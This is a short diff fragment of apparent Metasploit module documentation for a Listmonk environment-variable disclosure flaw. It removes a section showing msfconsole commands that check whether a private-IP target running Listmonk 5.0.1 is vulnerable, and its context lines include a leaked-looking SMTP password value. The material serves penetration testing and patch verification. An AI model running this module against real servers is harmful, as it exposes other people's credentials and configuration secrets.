@@ -156,13 +156,3 @@ smtp_pass_2024
 
 [*] Auxiliary module execution completed
 ```
-
-### Running Check to Verify Target is Vulnerable
-
-```
-msf6 auxiliary(gather/listmonk_env_disclosure) > set RHOSTS 192.168.1.100
-RHOSTS => 192.168.1.100
-msf6 auxiliary(gather/listmonk_env_disclosure) > check
-
-[*] 192.168.1.100:9000 - The target appears to be vulnerable. Listmonk version 5.0.1 is vulnerable
-```
